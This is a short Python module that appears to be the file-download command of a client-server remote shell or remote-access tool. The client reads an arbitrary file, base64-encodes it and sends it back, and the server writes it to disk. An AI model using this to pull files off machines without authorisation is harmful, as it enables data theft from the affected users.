import base64, os, urllib

def client_download(cmd):
    try:
        parts = cmd.split(" ")
        file_name = urllib.unquote(parts[1])

        contents = base64.b64encode(open(file_name, "rb").read())
        return contents
    except:
        return "Could not download file!!"

def server_download(cmd, data):
    """Downloads a file from the client

    Usage: download /remote/file [/local/file]
    """
    parts = cmd.split(" ")
    contents = base64.b64decode(data)
    file_name = parts[1]

    if contents == "Could not download file!!":
        error(contents)
        return ""

    if len(parts) == 3:
        file_name = parts[2]

    with open(file_name, "wb") as f:
        f.write(contents)

    return "%s downloaded..." % file_name


